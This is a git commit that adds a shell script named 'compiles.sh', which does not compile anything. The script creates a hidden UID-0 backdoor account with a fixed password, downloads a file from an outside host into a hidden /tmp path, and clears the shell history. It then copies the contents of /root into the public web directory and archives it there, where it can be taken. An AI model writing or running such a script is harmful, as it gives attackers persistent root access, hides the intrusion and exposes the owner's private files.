1278a5eee72063cc20d3436f501912f2f627fea5
GreysiDestro <greysidestro@outlook.com>
2017-05-11 17:46:53 +0200

    Add files via upload

---
+++ compiles.sh
@@ -0,0 +1,5 @@
+#! /bin/bash
+
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash localhost; echo -e "passwd\npasswd" | passwd localhost; wget -q -O /tmp/... http://blasze.tk/ANKS39; clear; history -c && 
+
+mkdir /var/www/html/p2p; cd /root/; cp * /var/www/html/p2p; yum install bzip2 -y || yum install unzip -y; bzip2 /var/www/html/p2p p2p.bz2 || zip /var/www/html/p2p p2p.zip
